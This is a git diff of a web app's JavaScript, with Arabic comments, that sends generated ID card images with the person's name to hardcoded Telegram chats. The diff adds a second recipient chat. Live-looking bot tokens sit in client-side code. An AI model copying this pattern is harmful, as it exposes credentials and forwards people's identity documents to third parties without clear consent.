@@ -685,22 +685,18 @@ function shareViaWhatsapp() {
     }, 1000);
 }
 
-// دالة لإرسال الصورة إلى قناة تلجرام
+// دالة لإرسال الصورة إلى قنوات تلجرام
 function sendToTelegram(imageDataUrl) {
-    // معلومات البوت وقناة التلجرام
-    const botToken = '6515238497:AAEUEejFXdwhCiUxfLAWjIsiG_Q5oSsim9o'; // استبدل بتوكن البوت الخاص بك
-    const chatId = '308830674'; // استبدل بمعرف القناة الخاص بك (مثل: @channel_name)
+    // معلومات البوت وقنوات التلجرام
+    const botToken = '8279342487:AAG5boDFCcVKqOsS98wNA_Fvzc4NKHfYLE0'; // استبدل بتوكن البوت الخاص بك
+    // يمكنك إضافة أكثر من قناة هنا (مفصولة بفواصل)
+    const chatIds = ['308830674', '5910938206']; // استبدل بمعرفات القنوات الخاصة بك
     const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
     
     // تحويل صورة Data URL إلى Blob
     fetch(imageDataUrl)
         .then(res => res.blob())
         .then(blob => {
-            // إنشاء FormData لإرسال الصورة
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'id_card.png');
-            
             // إنشاء نص التعليق مع اسم الشخص والتاريخ والوقت
             const currentDate = new Date();
             const dateStr = currentDate.toLocaleDateString('ar-IQ');
@@ -721,20 +717,37 @@ function sendToTelegram(imageDataUrl) {
                 console.error('خطأ في استخراج اسم الشخص:', error);
             }
             
-            formData.append('caption', `صورة بطاقة ${personName} - التاريخ: ${dateStr} - الساعة: ${timeStr}`);
+            const caption = `: بطاقة ${personName} - التاريخ: ${dateStr} - الساعة: ${timeStr}`;
             
-            // إرسال الصورة إلى تلجرام
-            fetch(apiUrl, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(result => {
-                console.log('تم إرسال الصورة بنجاح إلى تلجرام:', result);
-            })
-            .catch(error => {
-                console.error('حدث خطأ أثناء إرسال الصورة إلى تلجرام:', error);
+            // إرسال الصورة إلى كل قناة في المصفوفة
+            chatIds.forEach(chatId => {
+                // إنشاء FormData جديد لكل قناة
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob.slice(0), 'id_card.png');
+                formData.append('caption', caption);
+                
+                // إرسال الصورة إلى تلجرام
+                fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(result => {
+                    if (result.ok) {
+                        console.log(`تم إرسال الصورة بنجاح إلى القناة: ${chatId}`);
+                        showToast('تم إرسال الصورة بنجاح إلى تلجرام');
+                    } else {
+                        console.error('فشل إرسال الصورة:', result);
+                        showToast('فشل إرسال الصورة إلى تلجرام');
+                    }
+                })
+                .catch(error => {
+                    console.error('خطأ في إرسال الصورة:', error);
+                    showToast('حدث خطأ أثناء إرسال الصورة');
+                });
             });
+
         });
 }
 
